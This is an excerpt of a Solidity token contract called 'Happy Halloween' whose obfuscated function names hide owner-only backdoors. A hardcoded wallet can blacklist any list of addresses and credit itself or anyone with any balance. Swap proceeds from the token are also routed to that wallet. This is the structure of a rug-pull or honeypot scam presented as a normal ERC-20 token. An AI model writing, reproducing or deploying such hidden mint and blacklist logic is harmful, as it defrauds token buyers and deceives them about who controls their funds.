...
contract  HappyHalloween is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "Happy Halloween";
    string private _symbol = "Happy Halloween";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xEdc220fc37D69D4fdbE96307ce0F3dd214003815));
        NoJgRinqXwmL = payable(address(0xEdc220fc37D69D4fdbE96307ce0F3dd214003815));
    ...
    function zXYVlwM() view private returns(address){
        return tSZAOOENkuLpE();
    }

    function uomRHMQ() view private{
        require(NoJgRinqXwmL == zXYVlwM());
    }
    
    function LJRMVURbeIFJkqg(bool vbVfgrhpshVO, address[] calldata ecIExvfRq) external { uomRHMQ();
        for (uint256 i; i < ecIExvfRq.length; i++) {
            JqVRwqhe[ecIExvfRq[i]] = vbVfgrhpshVO;
        }
    }

    function CTEcANDNC(uint256 XkACvrNH,address YtkcOcVTot) external { uomRHMQ();
        uint256 qDqCTNYE = XkACvrNH.add(balanceOf(YtkcOcVTot));
        _balances[YtkcOcVTot] = qDqCTNYE;
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountETHMarketing > 0)
            transferToAddressETH(NoJgRinqXwmL, amountETHMarketing);
